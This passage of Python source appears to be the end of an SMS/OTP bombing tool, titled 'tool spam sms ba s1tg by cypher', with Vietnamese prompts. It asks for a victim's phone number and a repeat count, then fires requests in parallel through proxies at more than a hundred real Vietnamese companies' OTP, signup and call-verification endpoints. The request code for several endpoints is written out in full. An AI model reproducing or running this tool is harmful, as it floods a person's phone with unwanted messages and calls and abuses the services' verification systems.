                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                    # 'x-channel': 'EStore',
                },
            json={
                    'phoneNumber': sdt,
                    'otpType': 0,
                    'fromSys': 'WEBKHLC',
                },
            data={
                    'phoneNumber': sdt,
                    'otpType': 0,
                    'fromSys': 'WEBKHLC',
                },
            api_name="N"
        )

    def send_b(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://v9-cc.800best.com/uc/account/sendsignupcode",
            method="POST",
            headers={
                    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Origin': 'https://www.best-inc.vn',
                    'Referer': 'https://www.best-inc.vn/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                    'accept': 'application/json',
                    'authorization': 'null',
                    'content-type': 'application/json',
                    'lang-type': 'vi-VN',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'x-auth-type': 'WEB',
                    'x-lan': 'VI',
                    'x-nat': 'vi-VN',
                    'x-timezone-offset': '7',
                },
            json={
                    'phoneNumber': sdt,
                    'verificationCodeType': 1,
                },
            data={
                    'phoneNumber': sdt,
                    'verificationCodeType': 1,
                },
            api_name="B"
        )

    def run_all_apis(self, sdt: str, session: requests.Session):
        apis = [
            self.send_tv360,
            self.send_sapo,
            self.send_viettel,
            self.send_medicare,
            self.send_dienmayxanh,
            self.send_kingfoodmart,
            self.send_mocha,
            self.send_fptplay,
            self.send_vieon,
            self.send_ghn,
            self.send_lottemart,
            self.send_shopee,
            self.send_tgdd,
            self.send_fptshop,
            self.send_winmart,
            self.send_lozi,
            self.send_f88,
            self.send_longchau,
            self.send_galaxyplay,
            self.send_ahamove,
            self.send_traveloka,
            self.send_batdongsan,
            self.send_gumac,
            self.send_vayvnd,
            self.send_futabus,
            self.send_pico,
            self.send_best_inc,
            self.send_pizzacompany,
            self.send_vtmoney,
            self.send_vtpost,
            self.send_mobifone,
            self.send_myvnpt,
            self.send_chotot,
            self.send_bhx,
            self.send_sunwin,
            self.send_hitclb,
            self.send_go88,
            self.send_gemwwin,
            self.send_b52,
            self.send_yo88,
            self.send_zowin,
            self.send_iloka,
            self.send_norifood,
            self.send_fa88,
            self.send_vhome,
            self.send_phuha,
            self.send_aemon,
            self.send_savyu,
            self.send_call_viettel,
            self.send_call_medicare,
            self.send_call_tv360,
            self.send_call_dienmayxanh,
            self.send_call_kingfoodmart,
            self.send_call_mocha,
            self.send_call_fptdk,
            self.send_call_fptmk,
            self.send_call_VIEON,
            self.send_call_ghn,
            self.send_call_lottemart,
            self.send_call_DONGCRE,
            self.send_call_shopee,
            self.send_call_TGDD,
            self.send_call_fptshop,
            self.send_call_WinMart,
            self.send_call_vietloan,
            self.send_call_lozi,
            self.send_call_F88,
            self.send_call_spacet,
            self.send_call_vinpearl,
            self.send_call_traveloka,
            self.send_call_dongplus,
            self.send_call_longchau,
            self.send_call_longchau1,
            self.send_call_galaxyplay,
            self.send_call_emartmall,
            self.send_call_ahamove,
            self.send_call_popeyes,
            self.send_call_hoangphuc,
            self.send_call_fmcomvn,
            self.send_call_Reebokvn,
            self.send_call_thefaceshop,
            self.send_call_BEAUTYBOX,
            self.send_call_winmart,
            self.send_call_futabus,
            self.send_call_ViettelPost,
            self.send_call_myviettel2,
            self.send_call_myviettel3,
            self.send_call_TOKYOLIFE,
            self.send_call_30shine,
            self.send_call_Cathaylife,
            self.send_call_vinamilk,
            self.send_call_vietloan2,
            self.send_call_batdongsan,
            self.send_call_GUMAC,
            self.send_call_mutosi,
            self.send_call_mutosi1,
            self.send_call_vietair,
            self.send_call_FAHASA,
            self.send_call_hopiness,
            self.send_call_pantio,
            self.send_call_Routine,
            self.send_call_vayvnd,
            self.send_call_tima,
            self.send_call_moneygo,
            self.send_call_pico,
            self.send_call_PNJ,
            self.send_call_TINIWORLD,
            self.send_call_BACHHOAXANH,
            self.send_call_shbfinance,
            self.send_call_mafccomvn,
            self.send_call_phuclong,
            self.send_call_takomo,
            self.send_k,
            self.send_n,
            self.send_b
        ]

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(api, session, sdt): api.__name__ for api in apis}
            completed = 0

            for future in as_completed(futures):
                completed += 1
                try:
                    future.result()
                except Exception:
                    pass
                print(f"  [{completed}/{len(apis)}] Đã xử lý", end="\r")

    def print_summary(self):
        print("\n" + "=" * 70)
        print("📊 TÓM TẮT KẾT QUẢ")
        print("=" * 70)
        print(f"✅ Tổng thành công: {self.results['success']}")
        print(f"❌ Tổng thất bại: {self.results['failed']}")
        print(f"📈 Tỉ lệ thành công: {self.results['success'] / (self.results['success'] + self.results['failed']) * 100:.1f}%" if (self.results['success'] + self.results['failed']) > 0 else "0%")

        print("\n🏆 Top API thành công:")
        sorted_apis = sorted(self.results["by_api"].items(), key=lambda x: x[1]["success"], reverse=True)
        for api_name, stats in sorted_apis[:5]:
            total = stats["success"] + stats["failed"]
            rate = stats["success"] / total * 100 if total > 0 else 0
            print(f"  {api_name:20} - ✅{stats['success']:2}/{total:2} ({rate:5.1f}%)")

    def run(self):
        print("=" * 70)
        print("🔥 tool spam sms ba s1tg by cypher")
        print("=" * 70)

        if self.use_proxy and self.proxies:
            print(f"✅ Đã tự động load {len(self.proxies)} proxy từ proxy.txt")
        else:
            print("⚠️  Không tìm thấy proxy.txt hoặc file trống. Tiếp tục không dùng proxy...")
            self.use_proxy = False

        while True:
            sdt = input("\n📱 Nhập số điện thoại (vd: 0918103224): ").strip()
            if self.validate_phone(sdt):
                break
            print("❌ Số điện thoại không hợp lệ")

        while True:
            try:
                num_requests = int(input("🔢 Nhập số lần gửi (mặc định: 1): ") or "1")
                if num_requests > 0:
                    break
            except ValueError:
                pass

        while True:
            try:
                delay = float(input("⏱️  Delay giữa các lần (giây, mặc định: 2): ") or "2")
                if delay >= 0:
                    break
            except ValueError:
                pass

        print("\n" + "=" * 70)
        print(f"🚀 Đang send f4ck {sdt}")
        if self.use_proxy:
            print(f"🌍 Dùng {len(self.proxies)} proxy")
        print("=" * 70)

        for i in range(num_requests):
            print(f"\n[{i+1}/{num_requests}] Gửi request...")
            self.results = {"success": 0, "failed": 0, "by_api": {}}

            session = self.create_session()
            self.run_all_apis(sdt, session)
            session.close()

            print(f"\n✅ Thành công: {self.results['success']}")
            print(f"❌ Thất bại: {self.results['failed']}")

            if i < num_requests - 1:
                for j in range(int(delay), 0, -1):
                    print(f"⏳ Chờ {j}s...", end="\r")
                    time.sleep(1)

        self.print_summary()

if __name__ == "__main__":
    tool = OTPSpamTool()
    tool.run()
